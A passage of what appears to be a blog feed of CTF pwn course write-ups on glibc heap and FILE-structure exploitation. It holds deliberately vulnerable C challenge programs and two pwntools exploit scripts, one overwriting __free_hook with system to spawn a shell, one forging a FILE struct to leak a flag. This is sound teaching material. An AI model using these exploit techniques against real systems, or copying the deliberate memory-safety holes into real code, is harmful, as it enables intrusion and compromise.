 unsigned long secret_idx = 0, result_idx = 0, res = 0;

 fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70
 fastbin_size &amp;amp;= ~0xf;
 fastbin[0] = (unsigned long *) malloc( fastbin_size );
 fastbin[1] = (unsigned long *) malloc( fastbin_size );
 
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);

 secret_idx = rand() % (fastbin_size / 8);
 fastbin[1][ secret_idx ] = 0xdeadbeef;
 result_idx = ((unsigned long)(&amp;amp;fastbin[1][ secret_idx ]) - (unsigned long)(&amp;amp;fastbin[0][0])) / 8;
 
 printf(&amp;#34;Y[%lu] = 0xdeadbeef;\n&amp;#34;, secret_idx);
 printf(&amp;#34;X[?] == 0xdeadbeef\t(just send an integer, e.g. \&amp;#34;8\&amp;#34;)\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;res);

 if (fastbin[0][res] == 0xdeadbeef) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %lu\n&amp;#34;, result_idx);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** tcache fd chall ** -----------&amp;#34;);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** fastbin fd chall (final) ** -----------&amp;#34;);
 puts(&amp;#34;[*] Restore the chunk to X and Y&amp;#34;);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 fastbin[1] = malloc(fastbin_size);
 fastbin[0] = malloc(fastbin_size);
 printf(&amp;#34;[*] Do something to fill up 0x%lx tcache\n...\n[*] finish\n&amp;#34;, fastbin_size + 0x10);
 void *tmpchk[7];
 for (int i = 0; i &amp;lt; 7; i++)
 tmpchk[i] = malloc(fastbin_size);
 for (int i = 0; i &amp;lt; 7; i++)
 free(tmpchk[i]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 memset(tmpbuf, 0, 0x31);
 
 int fd = open(&amp;#34;/home/heapmath/flag&amp;#34;, O_RDONLY);
 read(fd, tmpbuf, 0x30);
 close(fd);
 printf(&amp;#34;Here is your flag: %s\n&amp;#34;, tmpbuf);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x16(simple_smallbin)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</guid><description>&lt;h1 id="simple-pwn-0x16simple_smallbin">
 Simple PWN 0x16(simple_smallbin)
 &lt;a class="anchor" href="#simple-pwn-0x16simple_smallbin">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/teWNhbh.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptrs[7];
 void *smallbin;
 int i;

 for (i = 0; i &amp;lt; 7; i++)
 ptrs[i] = malloc(0x108); // 0x110 chunk size

 smallbin = malloc(0x108);
 malloc(0x18);

 // aim to fill up tcache
 while(i)
 free(ptrs[--i]);
 
 free(smallbin);
 // trigger unsorted bin dispatch
 malloc(0x870);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x17(UAF - leak information)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</guid><description>&lt;h1 id="simple-pwn-0x17uaf---leak-information">
 Simple PWN 0x17(UAF - leak information)
 &lt;a class="anchor" href="#simple-pwn-0x17uaf---leak-information">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="uaf-backgroud">
 UAF backgroud
 &lt;a class="anchor" href="#uaf-backgroud">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/MwjSNFQIx0c">SS111-Pwn2&lt;/a>
&lt;a href="https://youtu.be/rMqvL9j0QaM?t=3009">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;img src="https://imgur.com/nFDhGiC.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *p1, *p2;
 p1 = malloc(0x30);
 p2 = malloc(0x30);

 free(p1);
 free(p2);

 puts(p2);
}
&lt;/code>&lt;/pre>&lt;p>If we set the pointer to &lt;code>NULL&lt;/code> after it was freed, then we can get some vital info. from this chunk.&lt;/p></description></item><item><title>Simple PWN 0x18(Lab - `babynote`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</guid><description>&lt;h1 id="simple-pwn-0x18lab---babynote">
 Simple PWN 0x18(Lab - &lt;code>babynote&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x18lab---babynote">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>hook - &lt;a href="https://youtu.be/MwjSNFQIx0c?t=838">SS111-Pwn2&lt;/a>
&lt;img src="https://imgur.com/lx8zR2J.png" alt="" />
&lt;a href="https://blog.xuite.net/peterlee.tw/twblog/112094832">Hook簡介&lt;/a>
&lt;a href="https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&amp;amp;url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&amp;amp;usg=AOvVaw26FwxmT40uQgIsFIlbjs2k">Hook Function (攔截函式)&lt;/a>&lt;/li>
&lt;li>The process of free and priority
Assume we malloc a memory with size over &lt;font color="FF0000">&lt;code>0x410&lt;/code>&lt;/font>, then when we free it, it&amp;rsquo;ll be classified to &lt;font color="FF0000">&lt;code>Unsorted bin&lt;/code>&lt;/font> instead of &lt;code>tcache&lt;/code>
&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />
&lt;img src="https://imgur.com/u2Wy9xw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

struct Note
{
 char name[0x10];
 void *data;
};

struct Note *notes[0x10];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 0x10)
 printf(&amp;#34;no, no ...\n&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);
 
 return size;
}

void add_note()
{
 short int idx;

 idx = get_idx();
 notes[idx] = malloc(sizeof(*notes[idx]));

 printf(&amp;#34;note name\n&amp;gt; &amp;#34;);
 read(0, notes[idx]-&amp;gt;name, 0x10);

 notes[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (notes[idx]-&amp;gt;data == NULL)
 notes[idx]-&amp;gt;data = malloc(size);
 
 read(0, notes[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_note()
{
 short int idx;

 idx = get_idx();
 free(notes[idx]-&amp;gt;data);
 free(notes[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_notes()
{
 for (int i = 0; i &amp;lt; 0x10; i++) {
 if (notes[i] == NULL || notes[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, notes[i]-&amp;gt;name, (char *)notes[i]-&amp;gt;data);
 }
}

int main()
{
 char opt[2];

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 while (1)
 {
 printf(&amp;#34;1. add_note\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_note\n&amp;#34;
 &amp;#34;4. show_notes\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_note(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_note(); break;
 case &amp;#39;4&amp;#39;: show_notes(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x19(Lab - `babyums` - flag 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</guid><description>&lt;h1 id="simple-pwn-0x19lab---babyums---flag-1">
 Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)
 &lt;a class="anchor" href="#simple-pwn-0x19lab---babyums---flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#define FLAG1 &amp;#34;flag{XXXXXXXX}&amp;#34;

struct User
{
 char name[0x10];
 char password[0x10];
 void *data;
};

struct User *users[8];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 8)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);

 if (size &amp;gt;= 0x500)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return size;
}

void add_user()
{
 short int idx;

 idx = get_idx();
 users[idx] = malloc(sizeof(*users[idx]));

 printf(&amp;#34;username\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;name, 0x10);

 printf(&amp;#34;password\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;password, 0x10);

 users[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (users[idx]-&amp;gt;data == NULL)
 users[idx]-&amp;gt;data = malloc(size);
 
 read(0, users[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_user()
{
 short int idx;

 idx = get_idx();
 free(users[idx]-&amp;gt;data);
 free(users[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_users()
{
 for (int i = 0; i &amp;lt; 8; i++) {
 if (users[i] == NULL || users[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, users[i]-&amp;gt;name, (char *)users[i]-&amp;gt;data);
 }
}

void add_admin()
{
 users[0] = malloc(sizeof(*users[0]));
 strcpy(users[0]-&amp;gt;name, &amp;#34;admin&amp;#34;);
 strcpy(users[0]-&amp;gt;password, FLAG1);
 users[0]-&amp;gt;data = NULL;
}

int main()
{
 char opt[2];
 int power = 20;

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 printf(&amp;#34;**** User Management System ****\n&amp;#34;);
 add_admin();

 while (power)
 {
 power--;
 printf(&amp;#34;1. add_user\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_user\n&amp;#34;
 &amp;#34;4. show_users\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_user(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_user(); break;
 case &amp;#39;4&amp;#39;: show_users(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 printf(&amp;#34;No... no power..., b..ye...\n&amp;#34;);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x20(Lab - `babyums` - flag 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</guid><description>&lt;h1 id="simple-pwn-0x20lab---babyums---flag-2">
 Simple PWN 0x20(Lab - &lt;code>babyums&lt;/code> - flag 2)
 &lt;a class="anchor" href="#simple-pwn-0x20lab---babyums---flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/2bR8lalySvKfA7Zr8DOhuA">Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Very similar in this article: &lt;a href="https://bernie6401.github.io/zj3FTgxZQ22EgRPn1KHUSg">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>
:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10008)

context.arch = &amp;#39;amd64&amp;#39;

def add_user(idx, user_name, user_passwd):
 r.sendafter(b&amp;#39;&amp;gt; &amp;#39;, b&amp;#39;1&amp;#39;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendafter(b&amp;#39;username\n&amp;gt; &amp;#39;, user_name)
 r.sendafter(b&amp;#39;password\n&amp;gt; &amp;#39;, user_passwd)

def edit_data(idx, note_size, message):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;2&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendlineafter(b&amp;#39;size\n&amp;gt; &amp;#39;, str(note_size))
 r.send(message)

def del_user(idx):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;3&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))

def show_user():
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;4&amp;#34;)


&amp;#39;&amp;#39;&amp;#39;------------------
Construct heap memory
------------------&amp;#39;&amp;#39;&amp;#39;
add_user(0, b&amp;#39;a&amp;#39;*8, b&amp;#39;aaaa&amp;#39;)
edit_data(0, 0x418, b&amp;#39;a&amp;#39;)

add_user(1, b&amp;#39;b&amp;#39;*8, b&amp;#39;bbbb&amp;#39;)
edit_data(1, 0x18, b&amp;#39;b&amp;#39;)

add_user(2, b&amp;#39;c&amp;#39;*8, b&amp;#39;cccc&amp;#39;)

&amp;#39;&amp;#39;&amp;#39;------------------
Leak libc address
------------------&amp;#39;&amp;#39;&amp;#39;
del_user(0)
show_user()
r.recvuntil(b&amp;#39;data:&amp;#39;)
libc = (u64(r.recv(8)) &amp;gt;&amp;gt; 8) - 0x1ecbe0 - 0xa000000000000
info(f&amp;#34;libc address: {hex(libc)}&amp;#34;)
free_hook_addr = libc + 0x1eee48
info(f&amp;#34;__free_hook address: {hex(free_hook_addr)}&amp;#34;)
libc_sys_addr = libc + 0x52290
info(f&amp;#34;__libc_system address: {hex(libc_sys_addr)}&amp;#34;)

&amp;#39;&amp;#39;&amp;#39;------------------
Construct fake chunk
------------------&amp;#39;&amp;#39;&amp;#39;
data = b&amp;#39;/bin/sh\x00&amp;#39;.ljust(0x10, b&amp;#39;b&amp;#39;)
fake_chunk = flat(
 0, 0x31,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 free_hook_addr
)

edit_data(1, 0x48, data + fake_chunk)
edit_data(2, 0x8, p64(libc_sys_addr))
del_user(1)

r.interactive()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x21(fopen, fread, fwrite, fclose)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</guid><description>&lt;h1 id="simple-pwn-0x21fopen-fread-fwrite-fclose">
 Simple PWN 0x21(fopen, fread, fwrite, fclose)
 &lt;a class="anchor" href="#simple-pwn-0x21fopen-fread-fwrite-fclose">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler fopen&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fread&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10];

 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fwrite&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10] = &amp;#34;TEST!!&amp;#34;;

 fp = fopen(&amp;#34;./test_write&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x22(Lab - `AAR`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</guid><description>&lt;h1 id="simple-pwn-0x22lab---aar">
 Simple PWN 0x22(Lab - &lt;code>AAR&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x22lab---aar">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;w&amp;#34;);
 read(0, buf, 0x1000);
 fwrite(buf, 0x10, 1, fp);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="exploit---heap-overflow--overlap-flag">
 Exploit - heap overflow + overlap flag
 &lt;a class="anchor" href="#exploit---heap-overflow--overlap-flag">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10010)

context.arch = &amp;#39;amd64&amp;#39;

flag_addr = 0x404050

raw_input()
payload = flat(
 p64(0)*4,
 p64(0xfbad0800), #_flags
 p64(0), #_IO_read_ptr
 p64(flag_addr), #_IO_read_end
 p64(0), #_IO_read_base
 p64(flag_addr), #_IO_write_base
 p64(flag_addr+0x10), #_IO_write_ptr
 p64(0)*8, #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain
 p64(0x1) #_fileno
)

r.send(payload)

r.interactive()
&lt;/code>&lt;/pre></description></item><item><title>Simple PWN 0x23(Lab - `AAW`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</guid><description>&lt;h1 id="simple-pwn-0x23lab---aaw">
 Simple PWN 0x23(Lab - &lt;code>AAW&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x23lab---aaw">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;
char owo[] = &amp;#34;OWO!&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;r&amp;#34;);
 read(0, buf, 0x1000);
 fread(buf, 0x10, 1, fp);

 if (strcmp(owo, &amp;#34;OWO!&amp;#34;) != 0)
 write(1, flag, sizeof(flag));

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</guid><description>&lt;h1 id="simple-pwn-0x312023-hw---notepad---stage---1">
 Simple PWN 0x31(2023 HW - Notepad - Stage - 1)
 &lt;a class="anchor" href="#simple-pwn-0x312023-hw---notepad---stage---1">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>nc 10.113.184.121 10044&lt;/p>
&lt;p>You should solve the PoW to invoke a new instance.
You can use the pow_solver.py script in the released zip to solve the PoW.
After you solve the PoW, the service will create a new container and show &amp;gt;you the port. Connect it to play this challenge!
